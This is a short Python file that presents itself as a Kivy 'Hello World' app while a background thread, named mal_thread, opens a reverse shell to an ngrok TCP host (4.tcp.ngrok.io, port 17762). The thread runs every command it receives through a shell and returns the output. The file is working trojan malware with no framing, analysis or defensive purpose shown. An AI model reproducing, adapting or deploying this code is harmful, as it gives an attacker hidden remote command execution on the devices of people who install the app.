#!/usr/bin/python3

from kivy.app import App
from kivy.uix.label import Label

import threading
import socket
import subprocess

ngrok_host = "4.tcp.ngrok.io"
open_port = 17762


def main():
    server_ip = socket.gethostbyname(ngrok_host)
    port = open_port
    
    #backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        if command[:2] == "cd":
            output = "OK"
            output_error = ""
        else:
            output = op.stdout.read()
            output_error = op.stderr.read()
        backdoor.send(output + output_error)


class App(App):
    def build(self):
        return Label(text="Hello World")


mal_thread = threading.Thread(target=main)
mal_thread.start()

app = App()
app.run()
